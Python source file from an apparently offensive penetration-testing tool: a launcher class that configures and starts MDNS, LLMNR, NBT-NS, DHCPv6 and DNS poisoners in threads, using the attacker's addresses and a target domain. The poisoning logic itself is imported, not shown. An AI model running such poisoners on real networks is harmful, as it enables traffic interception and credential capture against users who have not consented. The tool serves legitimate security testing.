#!/usr/bin/env python3
from loguru import logger
from .poisoners import MDNS, NBT_NS, LLMNR, DHCP6, DNSPoison
from threading import Thread


class PoisonLauncher:
    """[ Class to configure the poisoners to use  ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        asynchronous: (bool): [ To know how the program runs  ]
        poisoner_selector: [ Dictionary with the poisoners to use ]
        domain: [The domain that you are attacking]
    """

    def __init__(
        self,
        ip: str,
        ipv6: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        asynchronous: bool,
        poisoner_selector: dict,
        domain: str = None,
    ):
        self.__ip = ip
        self.__ipv6 = ipv6
        self.__mac_address = mac_address
        self.__iface = iface
        self.__info_logger = info_logger
        self.__asynchronous = asynchronous
        self.__poisoner_selector = poisoner_selector
        self.__domain = domain

    def __create_mdns(self):
        """[ Method to configure mdns poisoner ]"""
        self.__mdns_poisoner = MDNS(
            self.__ip,
            self.__ipv6,
            self.__mac_address,
            self.__iface,
            self.__info_logger,
        )

        if self.__asynchronous:

            self.__info_logger.info("Running mdns poisoning in the background")
            self.__mdns_poisoner.logger_level = "DEBUG"

    def __create_nbt_ns(self):

        """[ Method to configure nbt_ns poisoner ]"""
        self.__nbt_ns_poisoner = NBT_NS(
            self.__ip,
            self.__mac_address,
            self.__iface,
            self.__info_logger,
        )
        if self.__asynchronous:

            self.__info_logger.info("Running nbt_ns poisoning in the background")
            self.__nbt_ns_poisoner.logger_level = "DEBUG"

    def __create_llmnr(self):
        """[ Method to configure llmnr poisoner ]"""
        self.__llmnr_poisoner = LLMNR(
            self.__ip,
            self.__ipv6,
            self.__mac_address,
            self.__iface,
            self.__info_logger,
        )
        if self.__asynchronous:

            self.__info_logger.info("Running llmnr poisoning in the background")
            self.__llmnr_poisoner.logger_level = "DEBUG"

    def __create_dhcp6(self):
        """[ Method to configure dhcp6 poisoner ]"""
        self.__dhcp6_poisoner = DHCP6(
            self.__ip,
            self.__ipv6,
            self.__mac_address,
            self.__iface,
            self.__info_logger,
            self.__domain,
        )
        if self.__asynchronous:
            self.__info_logger.info("Running dhcp6 poisoning in the background")
            self.__dhcp6_poisoner.logger_level = "DEBUG"

    def __create_dns(self):
        """[ Method to configure dns poisoner ]"""
        self.__dns_poisoner = DNSPoison(
            self.__ip,
            self.__ipv6,
            self.__mac_address,
            self.__iface,
            self.__info_logger,
        )

        if self.__asynchronous:
            self.__info_logger.info("Running dns poisoning in the background")
            self.__dns_poisoner.logger_level = "DEBUG"

    def __start_mdns(self):
        """[ Method to start the mdns poisoner]"""
        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True
        mdns_thread.start()

    def __start_llmnr(self):
        """[ Method to start the llmnr poisoner]"""
        llmnr_thread = Thread(target=self.__llmnr_poisoner.start_llmnr_poisoning)
        llmnr_thread.daemon = True
        llmnr_thread.start()

    def __start_nbt_ns(self):
        """[ Method to start the nbt_ns poisoner]"""
        nbt_ns_thread = Thread(target=self.__nbt_ns_poisoner.start_nbt_ns_poisoning)
        nbt_ns_thread.daemon = True
        nbt_ns_thread.start()

    def __start_dhcp6(self):
        """[ Method to start the dhcp6 poisoner ]"""
        dhcp6_thread = Thread(target=self.__dhcp6_poisoner.start_dhcp6_poisoning)
        dhcp6_thread.dameon = True
        dhcp6_thread.start()

    def __start_dns(self):
        """[ Method to start the dhcp6 poisoner ]"""
        dns_thread = Thread(target=self.__dns_poisoner.start_dns_poisoning)
        dns_thread.dameon = True
        dns_thread.start()

    def start_poisoners(self):
        if "MDNS" in self.__poisoner_selector and self.__poisoner_selector["MDNS"] == 1:
            self.__create_mdns()
            self.__start_mdns()
        if (
            "LLMNR" in self.__poisoner_selector
            and self.__poisoner_selector["LLMNR"] == 1
        ):
            self.__create_llmnr()
            self.__start_llmnr()
        if (
            "NBT_NS" in self.__poisoner_selector
            and self.__poisoner_selector["NBT_NS"] == 1
        ):
            self.__create_nbt_ns()
            self.__start_nbt_ns()
        if (
            "DHCP6" in self.__poisoner_selector
            and self.__poisoner_selector["DHCP6"] == 1
        ):
            self.__create_dhcp6()
            self.__start_dhcp6()
        if "DNS" in self.__poisoner_selector and self.__poisoner_selector["DNS"] == 1:
            self.__create_dns()
            self.__start_dns()
